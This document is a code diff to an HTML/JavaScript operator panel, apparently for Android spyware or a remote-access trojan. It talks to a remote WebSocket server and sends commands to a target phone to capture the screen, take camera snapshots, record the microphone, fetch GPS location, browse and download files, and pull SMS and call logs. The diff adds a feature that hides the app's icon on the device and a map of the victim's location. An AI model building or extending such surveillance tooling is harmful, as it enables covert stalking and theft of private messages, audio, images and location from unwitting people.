@@ -10,7 +10,7 @@ body{
     font-family:Segoe UI;
     display:flex;
     height:100vh;
-    overflow:hidden; /* prevent body scroll */
+    overflow:hidden;
 }
 #sidebar{
     width:270px;
@@ -51,7 +51,7 @@ button:hover{
     flex:1;
     display:flex;
     flex-direction:column;
-    min-width:0; /* prevent flex overflow */
+    min-width:0;
 }
 #header{
     height:60px;
@@ -78,11 +78,17 @@ button:hover{
     overflow:auto;
     padding:20px;
 }
-/* table styles with wrapping */
+/* map container */
+#map{
+    height:400px;
+    width:100%;
+    border-radius:8px;
+}
+/* table */
 table{
     width:100%;
     border-collapse:collapse;
-    table-layout:fixed; /* helps with wrapping */
+    table-layout:fixed;
 }
 th,td{
     padding:10px;
@@ -95,9 +101,6 @@ th{
     background:#f7f9fc;
     text-align:left;
 }
-/* specific column widths for SMS/call logs (optional) */
-.sms-table .message-col { width:40%; }
-.call-table .name-col { width:20%; }
 /* file list */
 .file{
     padding:10px;
@@ -143,13 +146,14 @@ video,img{
 <button id="backCamToggle" onclick="toggleBackCam()">📷 Start Back Camera</button>
 <button id="micToggle" onclick="toggleMic()">🎤 Start Mic</button>
 
-<button onclick="send('getLocation')">📍 GPS</button>
+<button onclick="sendCommand('getLocation')">📍 GPS</button>
+<button id="iconToggle" onclick="toggleAppIcon()">👻 Hide Icon</button>
 
 <div class="section-title">Data</div>
 
-<button onclick="send('ls root')">📂 File Manager</button>
-<button onclick="send('getSMS inbox')">💬 SMS Logs</button>
-<button onclick="send('getCallLogs')">📞 Call Logs</button>
+<button onclick="sendCommand('listFiles', { path: 'root' })">📂 File Manager</button>
+<button onclick="sendCommand('getSMS', { box: 'inbox' })">💬 SMS Logs</button>
+<button onclick="sendCommand('getCallLogs')">📞 Call Logs</button>
 
 </div>
 
@@ -163,6 +167,7 @@ Ready.
 </div>
 </div>
 
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 const WS_URL = "wss://mirror-view.onrender.com";
 
@@ -170,13 +175,15 @@ let ws;
 let pc; // for screen sharing
 let currentData = [];
 let currentPage = 0;
-let dataType = null; // 'sms', 'call', 'file'
+let dataType = null; // 'sms', 'call', 'file', 'location'
+let mapInstance = null;
 
 // Toggle states
 let screenActive = false;
 let frontCamActive = false;
 let backCamActive = false;
 let micActive = false;
+let iconHidden = false;
 
 const panel = document.getElementById("panel");
 
@@ -205,12 +212,22 @@ function connect() {
             dataType = 'file';
             currentData = JSON.parse(msg.substring(10));
             renderFiles();
+        } else if (msg.startsWith("LOC_DATA:")) {
+            dataType = 'location';
+            const loc = JSON.parse(msg.substring(9));
+            renderMap(loc);
         } else if (msg.startsWith("CAMERA_IMAGE:")) {
             showImage(msg.substring(13));
         } else if (msg.startsWith("RTC_OFFER:screen:")) {
             handleOffer(msg.substring(17));
         } else if (msg.startsWith("ERROR:")) {
             panel.innerHTML = `<div style="color:red">Error: ${msg.substring(6)}</div>`;
+        } else if (msg.startsWith("APP_HIDDEN")) {
+            iconHidden = true;
+            document.getElementById("iconToggle").innerHTML = "👀 Show Icon";
+        } else if (msg.startsWith("APP_SHOWN")) {
+            iconHidden = false;
+            document.getElementById("iconToggle").innerHTML = "👻 Hide Icon";
         }
     };
 }
@@ -221,7 +238,24 @@ function setStatus(s) {
     el.style.background = s === "ONLINE" ? "#e8f5e9" : "#ffebee";
 }
 
-/* ===== SEND COMMAND ===== */
+/* ===== SEND COMMAND (JSON) ===== */
+function sendCommand(command, params = {}) {
+    if (!ws || ws.readyState !== 1) {
+        alert("Not connected");
+        return;
+    }
+    const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+    const payload = {
+        type: 'COMMAND',
+        command: command,
+        requestId: requestId,
+        params: params,
+        timestamp: Date.now()
+    };
+    ws.send(JSON.stringify(payload));
+}
+
+// Legacy plain send (for backward compatibility, but we'll use sendCommand for new features)
 function send(cmd) {
     if (ws && ws.readyState === 1) ws.send(cmd);
 }
@@ -229,11 +263,11 @@ function send(cmd) {
 /* ===== TOGGLE BUTTONS ===== */
 function toggleScreen() {
     if (screenActive) {
-        send("STOP_SCREEN_SHARE");
+        sendCommand('STOP_SCREEN_SHARE');
         document.getElementById("screenToggle").innerHTML = "🖥 Start Screen";
     } else {
         panel.innerHTML = "<h2>Waiting for screen...</h2>";
-        send("START_SCREEN_SHARE");
+        sendCommand('START_SCREEN_SHARE');
         document.getElementById("screenToggle").innerHTML = "⏹ Stop Screen";
     }
     screenActive = !screenActive;
@@ -241,15 +275,13 @@ function toggleScreen() {
 
 function toggleFrontCam() {
     if (frontCamActive) {
-        // For camera, we assume the device sends one image then stops.
-        // So we just revert the button.
+        // Camera sends one image then stops, so we just revert button
         document.getElementById("frontCamToggle").innerHTML = "📷 Start Front Camera";
     } else {
-        send("camFront");
+        sendCommand('cameraSnapshot', { camera: 'front' });
         document.getElementById("frontCamToggle").innerHTML = "⏹ Stop Front Camera";
     }
     frontCamActive = !frontCamActive;
-    // Auto-revert after 5 seconds if no stop command
     if (frontCamActive) {
         setTimeout(() => {
             if (frontCamActive) {
@@ -264,7 +296,7 @@ function toggleBackCam() {
     if (backCamActive) {
         document.getElementById("backCamToggle").innerHTML = "📷 Start Back Camera";
     } else {
-        send("camBack");
+        sendCommand('cameraSnapshot', { camera: 'back' });
         document.getElementById("backCamToggle").innerHTML = "⏹ Stop Back Camera";
     }
     backCamActive = !backCamActive;
@@ -280,23 +312,41 @@ function toggleBackCam() {
 
 function toggleMic() {
     if (micActive) {
-        send("stopAudio");
+        sendCommand('STOP_AUDIO_RECORDING');
         document.getElementById("micToggle").innerHTML = "🎤 Start Mic";
     } else {
-        send("startAudio");
+        sendCommand('START_AUDIO_RECORDING');
         document.getElementById("micToggle").innerHTML = "⏹ Stop Mic";
     }
     micActive = !micActive;
 }
 
+function toggleAppIcon() {
+    if (iconHidden) {
+        sendCommand('showApp');
+        document.getElementById("iconToggle").innerHTML = "👻 Hide Icon";
+    } else {
+        sendCommand('hideApp');
+        document.getElementById("iconToggle").innerHTML = "👀 Show Icon";
+    }
+    iconHidden = !iconHidden;
+}
+
 /* ===== PANEL RENDERERS ===== */
 function showImage(base64) {
     panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
-    // Reset camera toggles after image (since camera stops)
     frontCamActive = false;
     backCamActive = false;
     document.getElementById("frontCamToggle").innerHTML = "📷 Start Front Camera";
     document.getElementById("backCamToggle").innerHTML = "📷 Start Back Camera";
+}
+
+function renderMap(loc) {
+    panel.innerHTML = '<div id="map"></div>';
+    if (mapInstance) mapInstance.remove();
+    mapInstance = L.map('map').setView([loc.lat, loc.lon], 18);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+    L.circle([loc.lat, loc.lon], { radius: loc.accuracy, color: '#1976ff' }).addTo(mapInstance);
 }
 
 function renderTable() {
@@ -305,7 +355,6 @@ function renderTable() {
         return;
     }
 
-    // Filter columns based on dataType
     let filteredData;
     let columnStyles = "";
     if (dataType === 'sms') {
@@ -326,7 +375,7 @@ function renderTable() {
         }));
         columnStyles = "call-table";
     } else {
-        filteredData = currentData; // fallback (should not happen)
+        filteredData = currentData;
     }
 
     const start = currentPage * 20;
@@ -351,7 +400,6 @@ function renderTable() {
     });
     html += "</table>";
 
-    // Pagination
     const totalPages = Math.ceil(filteredData.length / 20);
     if (totalPages > 1) {
         html += `<div class="pagination">`;
@@ -370,10 +418,14 @@ function gotoPage(p) {
 }
 
 function renderFiles() {
+    if (!currentData || currentData.length === 0) {
+        panel.innerHTML = "<p>No files found</p>";
+        return;
+    }
     let html = "<h3>File Explorer</h3>";
     currentData.forEach(f => {
         html += `
-        <div class="file" onclick="send('${f.isDir ? 'ls ' : 'dl '}${f.path}')">
+        <div class="file" onclick="sendCommand('${f.isDir ? 'listFiles' : 'downloadFile'}', { path: '${f.path}' })">
             ${f.isDir ? '📁' : '📄'} ${f.name}
         </div>`;
     });
@@ -391,15 +443,20 @@ function handleOffer(sdp) {
             document.getElementById("v").srcObject = e.streams[0];
         };
         pc.onicecandidate = (e) => {
-            if (e.candidate)
-                ws.send("ICE_CANDIDATE:" + JSON.stringify(e.candidate));
+            if (e.candidate) {
+                sendCommand('iceCandidate', {
+                    candidate: e.candidate.candidate,
+                    sdpMid: e.candidate.sdpMid,
+                    sdpMLineIndex: e.candidate.sdpMLineIndex
+                });
+            }
         };
     }
     pc.setRemoteDescription({ type: 'offer', sdp: sdp })
         .then(() => pc.createAnswer())
         .then(a => pc.setLocalDescription(a))
         .then(() => {
-            ws.send("ANSWER:" + pc.localDescription.sdp);
+            sendCommand('answer', { sdp: pc.localDescription.sdp });
         });
 }
 
